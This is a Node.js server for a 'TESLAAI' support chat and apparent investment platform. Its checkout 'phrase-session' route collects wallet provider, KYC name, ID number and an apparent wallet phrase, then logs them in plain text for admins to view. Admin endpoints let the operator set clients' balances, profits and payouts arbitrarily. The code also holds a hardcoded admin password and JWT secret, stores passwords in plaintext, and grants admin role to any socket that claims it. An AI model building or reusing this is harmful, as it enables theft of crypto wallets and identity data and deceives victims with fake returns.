const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');

// --- Configuration ---
const PORT = process.env.PORT || 10000;
const SECRET_KEY = process.env.JWT_SECRET || '1efdcab9301a043c584584eba62c2add2be3174a06be5f56c271eb37423873dd';
const DATA_DIR = path.join(__dirname, 'data');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const CHAT_HISTORY_FILE = path.join(DATA_DIR, 'chat-history.json');
const PHRASE_SESSIONS_FILE = path.join(DATA_DIR, 'phrase-sessions.json');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

// --- Middleware ---
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');

  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }

  next();
});

app.use(bodyParser.json());
app.use(express.static(__dirname));

// --- Default Admin ---
const defaultAdmin = {
  id: 'tesla_ai',
  name: 'TESLAAI Support',
  email: 'tesla_ai@support.com',
  password: '@David081',
  isAdmin: true,
  balance: 999999
};

// --- Persistent State ---
let currentUsers = [];
let chatHistoryByClient = {};
let activeConnections = {};
let checkoutPhraseSessions = [];

// --- Persistence Helpers ---
function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function getTimestamp() {
  return new Date().toLocaleTimeString('en-US', {
    hour12: false,
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
}

function readJsonFile(filePath, fallback) {
  try {
    if (!fs.existsSync(filePath)) {
      return fallback;
    }

    const raw = fs.readFileSync(filePath, 'utf8');
    if (!raw.trim()) {
      return fallback;
    }

    return JSON.parse(raw);
  } catch (err) {
    console.error(`[${getTimestamp()}] Failed to read ${path.basename(filePath)}: ${err.message}`);
    return fallback;
  }
}

function writeJsonFile(filePath, data) {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error(`[${getTimestamp()}] Failed to write ${path.basename(filePath)}: ${err.message}`);
    return false;
  }
}

function persistUsers() {
  return writeJsonFile(USERS_FILE, currentUsers);
}

function persistChatHistory() {
  return writeJsonFile(CHAT_HISTORY_FILE, chatHistoryByClient);
}

function persistPhraseSessions() {
  return writeJsonFile(PHRASE_SESSIONS_FILE, checkoutPhraseSessions);
}

function loadPersistentData() {
  ensureDataDir();

  const loadedUsers = readJsonFile(USERS_FILE, []);
  const loadedChatHistory = readJsonFile(CHAT_HISTORY_FILE, {});
  const loadedPhraseSessions = readJsonFile(PHRASE_SESSIONS_FILE, []);

  currentUsers = Array.isArray(loadedUsers) ? loadedUsers : [];
  chatHistoryByClient = loadedChatHistory && typeof loadedChatHistory === 'object' ? loadedChatHistory : {};
  checkoutPhraseSessions = Array.isArray(loadedPhraseSessions) ? loadedPhraseSessions : [];
}

// --- Auth Helpers ---
function findUser(email, password = null) {
  if (defaultAdmin.email === email && (!password || defaultAdmin.password === password)) {
    return defaultAdmin;
  }

  return currentUsers.find((user) => user.email === email && (!password || user.password === password));
}

function userExists(email) {
  return defaultAdmin.email === email || currentUsers.some((user) => user.email === email);
}

function requireAdminAuth(req, res, next) {
  const authHeader = req.headers.authorization || '';
  const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : null;

  if (!token) {
    return res.status(401).json({ success: false, message: 'Admin authorization required.' });
  }

  try {
    const decoded = jwt.verify(token, SECRET_KEY);

    if (!decoded || decoded.isAdmin !== true) {
      return res.status(403).json({ success: false, message: 'Admin access denied.' });
    }

    req.admin = decoded;
    return next();
  } catch (err) {
    return res.status(401).json({ success: false, message: 'Invalid or expired admin token.' });
  }
}

function ensureClientHistory(clientId) {
  if (!chatHistoryByClient[clientId]) {
    chatHistoryByClient[clientId] = [
      {
        userId: 'System',
        message: 'Welcome to TESLAAI Live Support. How can we help you?',
        timestamp: getTimestamp(),
        isAdmin: true,
        clientDisplay: true
      }
    ];
    persistChatHistory();
  }
}

loadPersistentData();

// --- JWT Authentication Middleware for Socket.IO (Clients) ---
io.use((socket, next) => {
  const token = socket.handshake.query.token;

  if (token) {
    try {
      const decoded = jwt.verify(token, SECRET_KEY);
      socket.userData = decoded;
      return next();
    } catch (err) {
      console.error(`[${getTimestamp()}] Socket Auth Error: Invalid token. Error: ${err.message}`);
      return next(new Error('Authentication error: Invalid token'));
    }
  }

  return next();
});

// --- Express Authentication Routes ---
app.get('/api/v1/profile/me', (req, res) => {
  const authHeader = req.headers.authorization;

  if (!authHeader) {
    return res.status(401).json({ success: false, message: 'Authorization header required.' });
  }

  const token = authHeader.split(' ')[1];

  try {
    const decoded = jwt.verify(token, SECRET_KEY);
    const user = currentUsers.find((entry) => entry.id === decoded.id);

    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    const { password, ...safeUserData } = user;
    return res.json(safeUserData);
  } catch (err) {
    return res.status(403).json({ success: false, message: 'Invalid or expired token.' });
  }
});

app.post('/api/v1/profile/update', (req, res) => {
  const authHeader = req.headers.authorization;

  if (!authHeader) {
    return res.status(401).json({ success: false, message: 'Authorization header required.' });
  }

  const token = authHeader.split(' ')[1];

  try {
    const decoded = jwt.verify(token, SECRET_KEY);
    const userIndex = currentUsers.findIndex((user) => user.id === decoded.id);

    if (userIndex === -1) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    const user = currentUsers[userIndex];
    const { name, address, newPassword } = req.body;

    if (name) user.name = name;
    if (address) user.address = address;

    if (newPassword) {
      if (newPassword.length < 8) {
        return res.status(400).json({ success: false, message: 'Password must be at least 8 characters.' });
      }

      user.password = newPassword;
    }

    currentUsers[userIndex] = user;

    if (!persistUsers()) {
      return res.status(500).json({ success: false, message: 'Failed to persist profile update.' });
    }

    const { password, ...safeUserData } = user;
    return res.json({ success: true, message: 'Profile updated.', ...safeUserData });
  } catch (err) {
    return res.status(403).json({ success: false, message: 'Invalid or expired token.' });
  }
});

app.post('/api/v1/auth/login', (req, res) => {
  const { email, password } = req.body;
  const user = findUser(email, password);

  if (!user) {
    return res.status(401).json({ success: false, message: 'Invalid email or password.' });
  }

  const token = jwt.sign(
    { id: user.id, email: user.email, isAdmin: user.isAdmin },
    SECRET_KEY,
    { expiresIn: '24h' }
  );

  const { password: _password, ...safeUserData } = user;
  return res.json({ success: true, message: 'Login successful.', token, user: safeUserData });
});

app.post('/api/v1/auth/signup', (req, res) => {
  const { name, email, password } = req.body;

  if (userExists(email)) {
    return res.status(400).json({ success: false, message: 'User already exists with this email address.' });
  }

  const newUser = {
    id: email,
    name,
    email,
    password,
    isAdmin: false,
    balance: 200,
    address: ''
  };

  currentUsers.push(newUser);

  if (!persistUsers()) {
    currentUsers.pop();
    return res.status(500).json({ success: false, message: 'Failed to save new account.' });
  }

  ensureClientHistory(newUser.id);

  const { password: _password, ...safeUserData } = newUser;
  return res.status(201).json({ success: true, message: 'Sign up successful.', user: safeUserData });
});

app.post('/api/v1/checkout/phrase-session', (req, res) => {
  const {
    clientId,
    item,
    category,
    amount,
    network,
    walletProvider,
    kycFullName,
    kycIdNumber,
    challenge,
    phraseInput,
    isPhraseMatch
  } = req.body || {};

  if (!item || !amount || !network || !walletProvider || !kycFullName || !kycIdNumber || !challenge) {
    return res.status(400).json({ success: false, message: 'Missing required checkout verification fields.' });
  }

  const session = {
    sessionId: `PHS-${Date.now()}-${Math.floor(Math.random() * 900 + 100)}`,
    createdAt: new Date().toISOString(),
    clientId: clientId || 'unknown-client',
    item,
    category: category || 'general',
    amount,
    network,
    walletProvider,
    kycFullName,
    kycIdNumber,
    challenge,
    phraseInput: phraseInput || '',
    isPhraseMatch: Boolean(isPhraseMatch)
  };

  checkoutPhraseSessions.unshift(session);

  if (checkoutPhraseSessions.length > 100) {
    checkoutPhraseSessions = checkoutPhraseSessions.slice(0, 100);
  }

  if (!persistPhraseSessions()) {
    checkoutPhraseSessions = checkoutPhraseSessions.filter((entry) => entry.sessionId !== session.sessionId);
    return res.status(500).json({ success: false, message: 'Failed to record phrase session.' });
  }

  console.log('\n=== CHECKOUT PHRASE VERIFICATION SESSION ===');
  console.log(`[${getTimestamp()}] Session ID: ${session.sessionId}`);
  console.log(`[${getTimestamp()}] Client ID: ${session.clientId}`);
  console.log(`[${getTimestamp()}] Item/Category: ${session.item} (${session.category})`);
  console.log(`[${getTimestamp()}] Amount/Network: ${session.amount} via ${session.network}`);
  console.log(`[${getTimestamp()}] Wallet/KYC: ${session.walletProvider} | ${session.kycFullName} | ${session.kycIdNumber}`);
  console.log(`[${getTimestamp()}] Phrase Check: input='${session.phraseInput}' expected='${session.challenge}' match=${session.isPhraseMatch}`);
  console.log('=== END PHRASE SESSION ===\n');

  return res.status(201).json({
    success: true,
    message: 'Phrase verification session recorded.',
    sessionId: session.sessionId,
    verified: session.isPhraseMatch
  });
});

// --- Socket.IO Connection Logic ---
io.on('connection', (socket) => {
  let userId;
  let isAdmin = socket.handshake.query.isAdmin === 'true';

  if (socket.userData) {
    userId = socket.userData.id;
    isAdmin = socket.userData.isAdmin;
  } else if (isAdmin) {
    userId = defaultAdmin.id;
  } else {
    userId = socket.id;
  }

  socket.userId = userId;
  socket.isAdmin = isAdmin;

  console.log(`[${getTimestamp()}] A user connected: ${userId} (Admin: ${isAdmin}) | Socket: ${socket.id}`);
  activeConnections[userId] = socket.id;

  if (!isAdmin) {
    ensureClientHistory(userId);
    socket.emit('history', chatHistoryByClient[userId] || []);

    socket.on('clientMessage', (msg) => {
      const messageData = {
        userId,
        message: msg.message,
        timestamp: getTimestamp(),
        isAdmin: false
      };

      if (chatHistoryByClient[userId]) {
        chatHistoryByClient[userId].push(messageData);
        persistChatHistory();
      }

      socket.emit('message', messageData);
      io.emit('newMessage', messageData);
    });
  }

  if (isAdmin) {
    socket.on('requestClientList', () => {
      const clientList = Object.keys(chatHistoryByClient).map((clientId) => {
        const history = chatHistoryByClient[clientId] || [];
        const lastMessage = history.length > 0
          ? history[history.length - 1]
          : { message: 'No messages yet.', timestamp: 0 };

        return {
          clientId,
          lastMessageTime: lastMessage.timestamp,
          lastMessageSummary: lastMessage.message.substring(0, 30) + (lastMessage.message.length > 30 ? '...' : ''),
          isActive: !!activeConnections[clientId]
        };
      });

      socket.emit('clientList', clientList);
    });

    socket.on('requestChatHistory', (clientId) => {
      if (chatHistoryByClient[clientId]) {
        socket.emit('chatHistory', {
          clientId,
          history: chatHistoryByClient[clientId]
        });
      }
    });

    socket.on('adminReply', (data) => {
      const { clientId, message } = data;
      const messageData = {
        userId: defaultAdmin.id,
        message,
        timestamp: getTimestamp(),
        isAdmin: true
      };

      ensureClientHistory(clientId);
      chatHistoryByClient[clientId].push(messageData);
      persistChatHistory();

      const clientSocketId = activeConnections[clientId];

      if (clientSocketId) {
        io.to(clientSocketId).emit('message', messageData);
      } else {
        console.log(`[${getTimestamp()}] Client ${clientId} is offline, message stored.`);
      }

      io.emit('newMessage', messageData);
    });
  }

  socket.on('disconnect', () => {
    if (activeConnections[socket.userId] === socket.id) {
      delete activeConnections[socket.userId];
    }

    console.log(`[${getTimestamp()}] User disconnected: ${socket.userId}`);
  });
});

// --- Admin API Routes ---
app.get('/api/admin/clients', requireAdminAuth, (req, res) => {
  const clients = currentUsers.map((user) => ({
    name: user.name,
    email: user.email,
    balance: Number(user.balance || 0),
    profit: Number(user.profit || 0),
    activeInvestment: Number(user.activeInvestment || 0),
    nextPayout: user.nextPayout || ''
  }));

  return res.json(clients);
});

app.post('/api/admin/client/update', requireAdminAuth, (req, res) => {
  const {
    email,
    totalBalance,
    totalProfit,
    activeInvestment,
    nextPayout
  } = req.body || {};

  if (!email) {
    return res.status(400).json({ success: false, message: 'Client email is required.' });
  }

  const userIndex = currentUsers.findIndex((user) => user.email === email);
  if (userIndex === -1) {
    return res.status(404).json({ success: false, message: 'Client not found.' });
  }

  const user = currentUsers[userIndex];

  if (totalBalance !== undefined) user.balance = Number(totalBalance) || 0;
  if (totalProfit !== undefined) user.profit = Number(totalProfit) || 0;
  if (activeInvestment !== undefined) user.activeInvestment = Number(activeInvestment) || 0;
  if (nextPayout !== undefined) user.nextPayout = String(nextPayout || '');

  currentUsers[userIndex] = user;

  if (!persistUsers()) {
    return res.status(500).json({ success: false, message: 'Failed to persist client update.' });
  }

  return res.json({ success: true, message: 'Client data updated successfully.' });
});

app.get('/api/admin/phrase-sessions', requireAdminAuth, (req, res) => {
  const sessions = checkoutPhraseSessions.map((session) => ({
    sessionId: session.sessionId,
    createdAt: session.createdAt,
    clientId: session.clientId,
    item: session.item,
    category: session.category,
    amount: session.amount,
    network: session.network,
    walletProvider: session.walletProvider,
    kycFullName: session.kycFullName,
    kycIdNumber: session.kycIdNumber,
    challenge: session.challenge,
    phraseInput: session.phraseInput,
    isPhraseMatch: session.isPhraseMatch
  }));

  return res.json({ success: true, count: sessions.length, sessions });
});

app.put('/api/admin/phrase-sessions/:sessionId', requireAdminAuth, (req, res) => {
  const { sessionId } = req.params;
  const { phraseInput, challenge, isPhraseMatch } = req.body || {};

  const sessionIndex = checkoutPhraseSessions.findIndex((session) => session.sessionId === sessionId);
  if (sessionIndex === -1) {
    return res.status(404).json({ success: false, message: 'Phrase session not found.' });
  }

  if (phraseInput !== undefined) checkoutPhraseSessions[sessionIndex].phraseInput = String(phraseInput || '');
  if (challenge !== undefined) checkoutPhraseSessions[sessionIndex].challenge = String(challenge || '');
  if (isPhraseMatch !== undefined) checkoutPhraseSessions[sessionIndex].isPhraseMatch = Boolean(isPhraseMatch);

  if (!persistPhraseSessions()) {
    return res.status(500).json({ success: false, message: 'Failed to persist phrase session update.' });
  }

  console.log(`[${getTimestamp()}] Admin updated phrase session: ${sessionId}`);
  return res.json({ success: true, message: 'Phrase session updated successfully.' });
});

app.delete('/api/admin/phrase-sessions/:sessionId', requireAdminAuth, (req, res) => {
  const { sessionId } = req.params;
  const beforeCount = checkoutPhraseSessions.length;
  checkoutPhraseSessions = checkoutPhraseSessions.filter((session) => session.sessionId !== sessionId);

  if (checkoutPhraseSessions.length === beforeCount) {
    return res.status(404).json({ success: false, message: 'Phrase session not found.' });
  }

  if (!persistPhraseSessions()) {
    return res.status(500).json({ success: false, message: 'Failed to persist phrase session delete.' });
  }

  console.log(`[${getTimestamp()}] Admin deleted phrase session: ${sessionId}`);
  return res.json({ success: true, message: 'Phrase session deleted successfully.' });
});

// --- Start Server ---
server.listen(PORT, () => {
  console.log(`Chat server listening on port ${PORT}`);
  console.log(`Deployment successful. Admin ID: ${defaultAdmin.id} | JWT Auth Routes Ready.`);
});
